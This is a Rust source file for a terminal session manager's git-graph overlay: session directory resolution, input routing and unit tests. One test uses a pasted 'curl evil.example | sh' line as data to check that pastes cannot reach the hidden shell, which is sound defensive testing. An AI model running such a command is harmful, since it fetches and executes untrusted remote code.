//! The git graph overlay: resolving which repository the focused session is
//! in, and routing input to it.
//!
//! Kept out of `lib.rs`, which is already long enough that adding a feature's
//! worth of methods to it makes the event loop harder to follow.

use std::path::{Path, PathBuf};

use asd_git::{GitGraph, Outcome};

use crate::App;
use crate::platform;

/// Why the overlay could not be opened. Each variant is a different thing to
/// tell the user.
///
/// Written out rather than derived: `thiserror` is not one of this crate's
/// dependencies, and one error type is not worth adding it for.
#[derive(Debug)]
pub(crate) enum OverlayError {
    UnknownDirectory,
    Open(asd_git::OpenError),
}

impl std::fmt::Display for OverlayError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::UnknownDirectory => f.write_str("cannot determine this session's directory"),
            // `OpenError` already names the path it failed on, which is the
            // whole content of the message the user needs.
            Self::Open(source) => write!(f, "{source}"),
        }
    }
}

impl std::error::Error for OverlayError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            Self::UnknownDirectory => None,
            Self::Open(source) => Some(source),
        }
    }
}

impl From<asd_git::OpenError> for OverlayError {
    fn from(source: asd_git::OpenError) -> Self {
        Self::Open(source)
    }
}

/// The directory a session with this pid is sitting in.
pub(crate) fn resolve_repo_path(pid: u32) -> Result<PathBuf, OverlayError> {
    platform::session_cwd(pid).ok_or(OverlayError::UnknownDirectory)
}

pub(crate) fn open_at(path: &Path) -> Result<GitGraph, OverlayError> {
    Ok(GitGraph::open(path)?)
}

/// `path` with its symlinks resolved, or `path` unchanged when it cannot be
/// resolved (it vanished, or a component is unreadable). Only ever used to
/// compare two paths, where falling back costs a rebuild and nothing worse.
fn canonical(path: &Path) -> PathBuf {
    path.canonicalize().unwrap_or_else(|_| path.to_path_buf())
}

impl App {
    /// The pid of the session the sidebar has selected, if it is known.
    fn active_pid(&self) -> Option<u32> {
        let name = self.active.as_deref()?;
        self.sessions
            .iter()
            .find(|s| s.name == name)
            .map(|s| s.pid)
            .filter(|pid| *pid != 0)
    }

    /// `Ctrl+A g`: open the overlay for the focused session, or close it.
    pub(crate) fn toggle_git_graph(&mut self) {
        if self.git_graph.is_some() {
            self.git_graph = None;
            self.dirty = true;
            return;
        }
        match self.open_git_graph() {
            Ok(graph) => self.git_graph = Some(graph),
            Err(e) => self.notice = Some(e.to_string()),
        }
        self.dirty = true;
    }

    fn open_git_graph(&self) -> Result<GitGraph, OverlayError> {
        let pid = self.active_pid().ok_or(OverlayError::UnknownDirectory)?;
        let path = resolve_repo_path(pid)?;
        open_at(&path)
    }

    /// Re-target the open overlay after the selection moved to another session.
    ///
    /// Switching to a directory that is not a repository leaves the overlay
    /// open showing why: the user asked to look at history, and closing it for
    /// them would be presumptuous.
    pub(crate) fn follow_git_graph(&mut self) {
        let Some(current) = self.git_graph.as_ref() else {
            return;
        };
        // A session whose pid is not known yet — `Ev::Created` selects it
        // before the list that carries the pid arrives — has nothing to
        // resolve. This is a retry, not a give-up: `self.active` is already
        // set, so no later `select` would come back to it, and the overlay
        // would sit on the previous session's repository for good. The next
        // session list finishes the job.
        let Some(pid) = self.active_pid() else {
            self.git_graph_follow_pending = true;
            return;
        };
        let Ok(cwd) = resolve_repo_path(pid) else {
            return;
        };
        // Decide from the directory, not by opening a second graph and
        // comparing: `GitGraph::open` drains the whole history walk, so
        // "did the repository change?" answered that way costs a full rebuild
        // on every selection change even when the answer is no. A readlink
        // and a path comparison answer it for nothing, which is what keeps
        // the scroll position across a switch inside one repository.
        //
        // A session sitting in a submodule of the open repository reads as
        // the same repository here and keeps the superproject's graph. That
        // is a stale view, not an unsound one, and `Ctrl+A g` twice re-opens.
        //
        // Both sides are canonicalized first. gix's `workdir()` and the cwd
        // read out of the process can name the same directory through
        // different symlinks (macOS `/var` -> `/private/var`, or any
        // symlinked checkout), and comparing them raw then fails for *every*
        // switch inside one repository — rebuilding the whole graph and
        // losing the scroll position, which is the exact cost this comparison
        // exists to avoid. `Repo::open`'s own tests canonicalize for the same
        // reason.
        if canonical(&cwd).starts_with(canonical(current.workdir())) {
            return;
        }
        match open_at(&cwd) {
            Ok(graph) => self.git_graph = Some(graph),
            // The real error, the same one `Ctrl+A g` would have shown: which
            // of "not a git repository", "no working tree" and an I/O failure
            // it was, and on which path.
            Err(e) => self.notice = Some(e.to_string()),
        }
        self.dirty = true;
    }

    /// Route a key to the overlay. Returns true when the key was the
    /// overlay's, so the caller stops.
    pub(crate) fn on_git_graph_key(&mut self, k: crate::CtKey) -> bool {
        let Some(graph) = self.git_graph.as_mut() else {
            return false;
        };
        let outcome = graph.on_key(k);
        match outcome {
            // Every navigation key returns `Consumed`; nothing in phase 1
            // constructs `Redraw`. Both repaint — treating `Consumed` as
            // "nothing changed" would leave the selection visibly stuck.
            Outcome::Consumed | Outcome::Redraw => self.dirty = true,
            Outcome::Dismiss => {
                self.git_graph = None;
                self.dirty = true;
            }
            Outcome::Copy(text) => {
                self.copy_to_host(text);
                self.dirty = true;
            }
            // `Outcome` is `#[non_exhaustive]`: phases 2 and 3 add variants.
            // An outcome this build does not know was still *handled* by the
            // overlay, so repaint and keep the key — falling through to the
            // session would type it into a hidden shell.
            _ => self.dirty = true,
        }
        true
    }

    /// Route a mouse event to the overlay. Returns true when the overlay
    /// consumed it, so the caller stops.
    pub(crate) fn on_git_graph_mouse(&mut self, m: crate::MouseEvent) -> bool {
        let Some(graph) = self.git_graph.as_mut() else {
            return false;
        };
        let before = graph.selected();
        let outcome = graph.on_mouse(m);
        // Crossterm's mouse capture enables 1002/1003, so a motion report
        // arrives on every mouse move and the overlay answers `Consumed`
        // without doing anything. Dirtying the frame for each would repaint
        // the whole graph per pixel of movement, on the one thread that draws
        // every session. Ask what actually moved instead.
        let selection_moved = graph.selected() != before;
        match outcome {
            Outcome::Consumed => self.dirty |= selection_moved,
            Outcome::Redraw => self.dirty = true,
            Outcome::Dismiss => {
                self.git_graph = None;
                self.dirty = true;
            }
            Outcome::Copy(text) => {
                self.copy_to_host(text);
                self.dirty = true;
            }
            _ => self.dirty = true,
        }
        true
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    use crate::conn::{Cmd, Conn, Ev};
    use crate::{CtKey, KeyCode, KeyModifiers};

    /// A minimal `App`. The connection actor is pointed at a socket path that
    /// does not exist: it fails to connect, reports `Ev::Down` into a channel
    /// nothing reads, and ends — which is all a test that never talks to a
    /// daemon needs from it.
    fn test_app() -> App {
        let (ev_tx, ev_rx) = std::sync::mpsc::channel();
        let socket = std::env::temp_dir().join(format!("asd-no-daemon-{}", std::process::id()));
        let conn = Conn::spawn(socket.clone(), 1, ev_tx.clone());
        App {
            socket,
            conn,
            ev_rx,
            ev_tx,
            connection_generation: 1,
            sessions: Vec::new(),
            closing_sessions: Default::default(),
            running_activity: Default::default(),
            host_links: Default::default(),
            active: None,
            view_revoked: None,
            vt: None,
            scroll: 0,
            grid: (80, 24),
            vt_grid: (80, 24),
            term_size: (110, 25),
            sidebar_w: crate::ui::SIDEBAR_W,
            sidebar_scroll: 0,
            sidebar_hidden: false,
            status_hidden: false,
            dragging_divider: false,
            sel: None,
            selecting: false,
            clipboard: None,
            cursor_tail: None,
            daemon_up: false,
            notice: None,
            modal: None,
            git_graph: None,
            git_graph_follow_pending: false,
            keymap: crate::keymap::Keymap::default(),
            now_ms: 0,
            metrics: None,
            preferred: None,
            terminal_appearance: Default::default(),
            startup_input: Vec::new(),
            // Never inherited from the environment: this test process may
            // itself be running inside an asd session.
            self_session: None,
            cache: None,
            parked: Vec::new(),
            pane_hold: None,
            pane_cache: None,
            pane_needs_render: true,
            sync_since: None,
            row_fx: Vec::new(),
            running_fx: Vec::new(),
            last_frame: std::time::Instant::now(),
            dirty: true,
            quit: false,
        }
    }

    /// `test_app()` with its command channel intercepted, so a test can ask
    /// what — if anything — was sent on to the session. The spawned actor's
    /// sender is dropped, which is how that thread learns to stop.
    fn app_watching_commands() -> (App, tokio::sync::mpsc::UnboundedReceiver<Cmd>) {
        let mut app = test_app();
        let (cmd_tx, cmd_rx) = tokio::sync::mpsc::unbounded_channel();
        app.conn = Conn { cmd_tx };
        (app, cmd_rx)
    }

    /// A throwaway repository with a little history, so an overlay opened on
    /// it has rows a key can actually move through. Built here rather than
    /// borrowed from `asd-git`, whose fixture is `#[cfg(test)]`-private to
    /// that crate, and used in preference to whatever repository the test
    /// runner happens to be sitting in so these tests cannot silently skip.
    struct ScratchRepo(PathBuf);

    impl ScratchRepo {
        fn new(tag: &str) -> Self {
            let dir = std::env::temp_dir().join(format!(
                "asd-tui-overlay-{tag}-{}-{}",
                std::process::id(),
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_nanos()
            ));
            std::fs::create_dir_all(&dir).unwrap();
            let me = Self(dir);
            me.git(&["init", "--quiet", "--initial-branch=main"]);
            me.git(&["config", "user.name", "asd test"]);
            me.git(&["config", "user.email", "test@example.invalid"]);
            me.git(&["config", "commit.gpgsign", "false"]);
            for i in 0..3 {
                let message = format!("commit {i}");
                me.git(&["commit", "--quiet", "--allow-empty", "-m", &message]);
            }
            me
        }

        fn path(&self) -> &Path {
            &self.0
        }

        /// Run git with a fixed identity and clock, so nothing depends on the
        /// host's git config or on how fast the machine runs `git`.
        fn git(&self, args: &[&str]) {
            let out = std::process::Command::new("git")
                .args(args)
                .current_dir(&self.0)
                .env("GIT_AUTHOR_DATE", "1700000000 +0000")
                .env("GIT_COMMITTER_DATE", "1700000000 +0000")
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .env("HOME", &self.0)
                .output()
                .unwrap_or_else(|e| panic!("running git {args:?}: {e}"));
            assert!(
                out.status.success(),
                "git {args:?}: {}",
                String::from_utf8_lossy(&out.stderr)
            );
        }
    }

    impl Drop for ScratchRepo {
        fn drop(&mut self) {
            std::fs::remove_dir_all(&self.0).ok();
        }
    }

    /// An app with the overlay open on a real repository.
    fn app_with_overlay(
        tag: &str,
    ) -> (ScratchRepo, App, tokio::sync::mpsc::UnboundedReceiver<Cmd>) {
        let repo = ScratchRepo::new(tag);
        let (mut app, cmds) = app_watching_commands();
        app.git_graph = Some(GitGraph::open(repo.path()).expect("a fresh repository opens"));
        (repo, app, cmds)
    }

    fn session(name: &str, pid: u32) -> asd_proto::SessionInfo {
        asd_proto::SessionInfo {
            name: name.to_string(),
            instance_id: u128::from(pid),
            command: "shell".to_string(),
            title: String::new(),
            status_line: String::new(),
            created_ms: 0,
            idle_ms: 0,
            running: false,
            state: asd_proto::AgentState::Unknown,
            attached_clients: 1,
            pid,
            cols: 80,
            rows: 24,
        }
    }

    #[test]
    fn a_follow_that_cannot_see_a_pid_yet_is_finished_by_the_next_list() {
        // `Ev::Created` selects the new session before the list carrying its
        // pid arrives, so `follow_git_graph` has nothing to resolve. Because
        // `self.active` is set by then, no later `select` revisits it — drop
        // the follow here and the overlay shows the *previous* session's
        // repository for as long as it stays open.
        let Ok(graph) = GitGraph::open(Path::new(".")) else {
            // No `.git` (a source tarball): there is no overlay to follow.
            return;
        };
        let mut app = test_app();
        app.git_graph = Some(graph);
        app.active = Some("brand-new".to_string());
        assert!(app.active_pid().is_none(), "the list has not arrived yet");

        app.follow_git_graph();
        assert!(
            app.git_graph_follow_pending,
            "an unresolvable follow is handed to the next list, not dropped"
        );
        assert!(
            app.notice.is_none(),
            "and says nothing while it waits: {:?}",
            app.notice
        );

        // The list lands, carrying the pid. This process is inside the asd
        // repository the overlay is already showing, so the follow resolves
        // and keeps the graph rather than rebuilding it.
        app.on_conn_event(Ev::Sessions(vec![session("brand-new", std::process::id())]));
        assert!(
            !app.git_graph_follow_pending,
            "the list consumes the pending follow"
        );
        assert!(app.git_graph.is_some(), "the overlay is still open");
        assert!(
            app.notice.is_none(),
            "a resolved follow raises nothing: {:?}",
            app.notice
        );
    }

    #[test]
    fn a_follow_with_no_overlay_open_arms_nothing() {
        let mut app = test_app();
        app.active = Some("brand-new".to_string());
        app.follow_git_graph();
        assert!(
            !app.git_graph_follow_pending,
            "there is no overlay to re-target"
        );
    }

    #[test]
    fn a_session_without_a_pid_cannot_be_resolved() {
        // pid 0 means "not known yet"; the overlay must say so rather than
        // opening the directory asd itself happens to be running in.
        assert!(matches!(
            resolve_repo_path(0),
            Err(OverlayError::UnknownDirectory)
        ));
    }

    #[test]
    fn a_non_repository_reports_which_path_failed() {
        let dir = std::env::temp_dir().join(format!("asd-overlay-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let err = open_at(&dir).expect_err("a plain directory is not a repository");
        let msg = err.to_string();
        assert!(
            msg.contains(&dir.display().to_string()),
            "the message names the path: {msg}"
        );
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn a_paste_cannot_reach_the_session_behind_the_overlay() {
        // The failure mode this guards is typing into the wrong shell: with
        // the overlay up, the session underneath is invisible, and a pasted
        // command or token would sit in its input buffer waiting for the next
        // Enter. The key path and the mouse path both stop at the overlay;
        // the paste path has to as well.
        let (_repo, mut app, mut cmds) = app_with_overlay("paste-blocked");
        app.scroll = 7;

        app.on_paste("curl evil.example | sh\n");

        match cmds.try_recv() {
            Err(_) => {}
            Ok(cmd) => panic!("a paste reached the session behind the overlay: {cmd:?}"),
        }
        assert_eq!(
            app.scroll, 7,
            "and it does not silently un-scroll the hidden pane either"
        );
        assert!(app.git_graph.is_some(), "the overlay stays open");
    }

    #[test]
    fn a_paste_with_nothing_on_top_still_reaches_the_session() {
        // The control for the test above: without it, blocking every paste
        // everywhere would pass just as well.
        let (mut app, mut cmds) = app_watching_commands();
        app.scroll = 7;

        app.on_paste("echo hello");

        match cmds.try_recv() {
            Ok(Cmd::Input(bytes)) => assert_eq!(bytes, b"echo hello"),
            other => panic!("an unobstructed paste is session input: {other:?}"),
        }
        assert_eq!(app.scroll, 0, "and it jumps the pane back to live");
    }

    #[test]
    fn an_ordinary_key_goes_to_the_overlay_and_not_to_the_session() {
        // `j` is a navigation key for the overlay and an ordinary byte for a
        // shell. While the overlay is up it must be the former only.
        let (_repo, mut app, mut cmds) = app_with_overlay("key-routed");
        assert_eq!(
            app.git_graph.as_ref().unwrap().selected(),
            0,
            "the newest commit starts selected"
        );

        app.on_key(CtKey::new(KeyCode::Char('j'), KeyModifiers::NONE));

        assert_eq!(
            app.git_graph.as_ref().unwrap().selected(),
            1,
            "the overlay moved its selection"
        );
        match cmds.try_recv() {
            Err(_) => {}
            Ok(cmd) => panic!("the key also reached the session: {cmd:?}"),
        }
    }
}
